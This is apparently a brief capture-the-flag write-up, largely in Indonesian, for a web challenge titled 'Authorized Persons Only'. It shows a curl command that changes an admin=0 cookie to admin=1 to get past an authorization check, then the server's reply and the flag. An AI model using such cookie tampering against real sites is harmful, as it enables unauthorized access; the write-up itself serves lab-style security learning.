<h1><b>Authorized Persons Only</h1></b>
<pre>
Authorized persons can get flag <a href="http://hack.bckdr.in:11007/">here</a>
</pre>
<b><h3>Solution</h3></b>
<p>Jika kita request ke halaman web maka akan muncul pesan <b>Authorizes Persons Only</b>, 
disini kita hanya perlu melihat cookie dari halaman yaitu admin=0 yang artinya kamu bukan seorang admin,
untuk jadi admin ganti ke admin=1</p>

```console
root@Python:/home/venom/Downloads# curl --cookie 'admin=1' http://hack.bckdr.in:11007/

<html>
	<head>
	</head>
	<body>
		<div>
			flag is CnAohOvgawaaYXAcJNOuWazQwGHPkvzLE5lGDeSeVCX5BZEVAOOerV7OYB4KFw2c
		</div>
	</body>
</html>
root@Python:/home/venom/Downloads# 
```

<b><h3>Flag</h3></b>
<pre>
CnAohOvgawaaYXAcJNOuWazQwGHPkvzLE5lGDeSeVCX5BZEVAOOerV7OYB4KFw2c
</pre>
